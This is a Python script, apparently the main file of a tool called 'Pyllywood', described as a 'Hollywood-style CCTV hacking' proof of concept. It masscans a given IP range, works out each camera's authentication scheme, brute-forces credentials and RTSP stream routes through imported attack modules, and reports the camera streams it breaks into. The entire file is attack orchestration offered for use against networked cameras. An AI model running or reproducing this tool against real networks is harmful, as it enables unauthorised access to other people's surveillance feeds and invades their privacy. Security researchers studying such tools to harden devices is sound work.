import sys, time, argparse, re
import pyfiglet #pip
from colorama import init
from termcolor import colored
from libs import masscanscanner as masscan
from libs import dealer
from libs import attackroutes
from libs import attackcredentials

init()
ascii_banner = pyfiglet.figlet_format("Pyllywood.")
print("{}\n{}\n\n".format(ascii_banner, "Hollywood-style CCTV hacking - Refactored PoC"))

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, help="Target in CIDR format, or just a single IP address.")
args = parser.parse_args()

cidrregex = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/(3[0-2]|[1-2][0-9]|[0-9]))$"
ipv4regex = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
if re.match(cidrregex, args.target) == None and re.match(ipv4regex, args.target) == None:
    print(colored("[ERR] Invalid target specified.", "red"))
    sys.exit(0)

print(colored("[INFO] Starting...", "cyan"))
scanResults = masscan.detect(args.target)
if scanResults == None:
    print(colored("[!] No targets found. Try another network.", "red"))
    sys.exit(0)

for target in scanResults:
    for port in scanResults[target]["tcp"]:
        if scanResults[target]["tcp"][port]["state"] != "open":
            continue # Skip closed ports (sanity check - no need)

        authMethod = dealer.decide(target, port) # Get auth method of current target

        if authMethod == None: # Target probably requires a known route
            print(colored("[INFO] {} at port {} probably requires a valid route first. Trying to find some...".format(target, port), "cyan"))
            routesFirst = attackroutes.start(target, port, authMethod)
            if len(routesFirst) > 0: # If routes found
                print(colored("[INFO] We got valid route(s) for {}:{}! Attacking now...".format(target, port), "cyan"))
                # Start credentials attack, with routes already found
                credsAfter = attackcredentials.start(target, port, authMethod, routesFirst)
                if len(credsAfter) > 0:
                    for cred in credsAfter:
                        print(colored("[SUCCESS] Found stream: {}".format(cred), "green"))
                else:
                    print(colored("[FAIL] No credentials found at {}:{}".format(target, port), "red"))
            else:
                print(colored("[FAIL] Could not find any valid routes at {}:{}".format(target, port), "red"))
        else: # Digest or Basic authentication
            print(colored("[INFO] {} at port {} probably requires a valid account first. Brute forcing now...".format(target, port), "cyan"))
            credsFirst = attackcredentials.start(target, port, authMethod)
            if len(credsFirst) > 0: # If credentials found
                print(colored("[INFO] We got valid credentials for {}:{}! Finding routes now...".format(target, port), "cyan"))
                for user in credsFirst[target][port]:
                    # Start routes attack with valid credentials
                    routesAfter = attackroutes.start(target, port, authMethod, user, credsFirst[target][port][user])
                    if len(routesAfter) > 0:
                        for stream in routesAfter:
                            print(colored("[SUCCESS] Found stream: {}".format(stream), "green"))
                    else:
                        print(colored("[FAIL] No valid routes found at {}:{}".format(target, port), "red"))
            else:
                print(colored("[FAIL] No credentials found at {}:{}".format(target, port), "red"))